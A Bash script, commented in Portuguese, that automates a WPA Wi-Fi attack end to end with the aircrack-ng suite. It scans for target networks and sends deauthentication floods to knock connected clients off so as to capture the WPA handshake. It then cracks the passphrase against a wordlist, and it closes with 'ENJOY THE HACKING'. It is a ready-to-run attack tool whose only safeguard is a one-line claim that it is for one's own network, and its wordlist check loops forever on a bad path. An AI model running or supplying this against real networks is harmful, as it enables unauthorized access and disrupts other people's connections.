#!/bin/bash

# Scrip feito para facilitar o fim educativo de hackear sua própría rede wifi :-).

clear

# EIXO PRINCIPAL
Principal(){
	MONMODE
}

# 1) Cria placa de rede em modo monitor promíscuo à placa de rede
MONMODE(){
nic=mon0
if iwconfig | grep -q $nic ; then
	clear
	echo''
	SOLARQ
else
	clear
	iw dev wlan0 interface add $nic type monitor &> /dev/null
	SOLARQ 
fi
}

# 2) Solicita nome do arquivo a ser gerado
SOLARQ(){
clear
echo '1) Indique o nome do arquivo a ser gerado:'
read arquivo
GERTAB
}

# 3) Gera tabela com todas as redes
GERTAB(){
echo "2) Quando encontrar a rede alvo, aperte CTRL+C."
xterm -title $arquivo -e airodump-ng --encrypt WPA $nic -w $arquivo -o csv
clear
COMDAD
}

# 4) Compila os dados do airdump
COMDAD(){
cat $arquivo-01.csv | cut -d ',' -f 1,4,14,9 | sed '/Station MAC/,$d' | sed '/^\s*$/d' | sed 's/,//g' | tail -n +2 | nl | awk '{print $1,$5,$2,$3,$4}' | column -t | sed '/ESSID/G' > $arquivo.txt
rm -rf $arquivo-01.csv
cat $arquivo.txt
echo ''
echo '3) Selecione o número da rede que deseja atacar:'
read num
bssidalvo=$(cat $arquivo.txt | awk -v aux=$num 'NR==aux {print $3}')
canal=$(cat $arquivo.txt | awk -v aux=$num 'NR==aux {print $4}')
nomerede=$(cat $arquivo.txt | awk -v aux=$num 'NR==aux {print $2}')
rm -rf $arquivo.txt
GERDAD
}

# 5) Gera dados para capturar o BSSID dos clientes
GERDAD(){
clear
echo '4) Espere listar pelo menos 2 clientes ou mais (abaixo do campo STATION) e então aperte CTRL+C.'
desejo=1
	while [ $desejo = 1 ]; do
		xterm -title $arquivo -e airodump-ng --bssid $bssidalvo -w $arquivo -o csv $nic
		echo "Deseja executar novamente? [0/1]"
		read desejo
	done
mac=$arquivo.lst
ls
cat $arquivo-01.csv | awk 'NR==6,NR==10' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
rm -rf $arquivo-01.csv
HANDSHAKE
}

# 7) Inicia o processo de captura do handshake
HANDSHAKE(){
echo "5) Aguarde até que no canto superior direito apareça: WPA Handshake XX:XX:XX:XX:XX:XX"
xterm -title $arquivo -e airodump-ng -d $bssidalvo -c $canal -w $arquivo -o cap $nic &
clear
nr=$(cat $mac | wc -l)
i=1
	while [ $i -le $nr ]; do
		bssidcliente=$(awk -v var=$i 'NR==var' $mac)
		xterm -title $arquivo -e aireplay-ng -0 15 -a $bssidalvo -c $bssidcliente $nic --ignore-negative-one
		let i=i+1
	done
rm -rf $arquivo.lst
WORDLIST
}

# 8) Busca e verificação de erro para o caminho da wordlist
WORDLIST(){
echo 'Digite o caminho para a wordlist:'
read path
a=0
while [ $a -eq 0  ]
do
	if [ !  -f $path ]; then
		echo "Arquivo inexistente, tente novamente."
	else
		a=1
	fi
done
AIRCRACK
}

# 9) Decriptografando a sennha
AIRCRACK(){
aircrack-ng $arquivo-01.cap -w $path
FIM
}

# 10) Reinicia os serviços de rede e exclui a placa de rede virtual criada
FIM(){
iw dev $nic del
service NetworkManager restart
service networking restart
clear
}
Principal
echo ##################################
echo ##	     ENJOY THE HACKING	     ##
echo ##################################
